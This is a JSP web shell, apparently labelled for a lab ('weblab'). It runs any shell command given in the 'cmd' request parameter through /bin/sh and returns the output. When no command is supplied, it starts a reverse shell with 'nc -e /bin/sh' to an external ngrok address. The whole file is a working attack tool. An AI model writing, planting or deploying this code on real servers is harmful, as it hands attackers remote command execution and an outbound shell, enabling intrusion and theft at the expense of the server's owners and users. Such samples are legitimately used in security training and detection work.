<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%!
private String readAll(InputStream stream) throws java.io.IOException {
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    byte[] chunk = new byte[1024];
    int read;
    while ((read = stream.read(chunk)) != -1) {
        buffer.write(chunk, 0, read);
    }
    return new String(buffer.toByteArray(), StandardCharsets.UTF_8);
}
%>
<%
response.setContentType("text/plain;charset=UTF-8");

String command = request.getParameter("cmd");
boolean interactiveShell = command == null || command.isBlank();

if (interactiveShell) {
    command = "nc -e /bin/sh 0.tcp.ap.ngrok.io 24385";
    Process process = new ProcessBuilder("/bin/sh", "-c", command)
            .redirectErrorStream(true)
            .start();

    out.println("weblab-jsp-shell-started");
    out.println("pid=" + process.pid());
    out.println("cmd=" + command);
    return;
}

Process process = new ProcessBuilder("/bin/sh", "-c", command)
        .redirectErrorStream(true)
        .start();
boolean finished = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);

out.println("weblab-jsp-cmd");
out.println("$ " + command);
out.println(readAll(process.getInputStream()));

if (!finished) {
    process.destroy();
    out.println("[timeout] process was destroyed after 5 seconds");
} else {
    out.println("[exit] " + process.exitValue());
}
%>
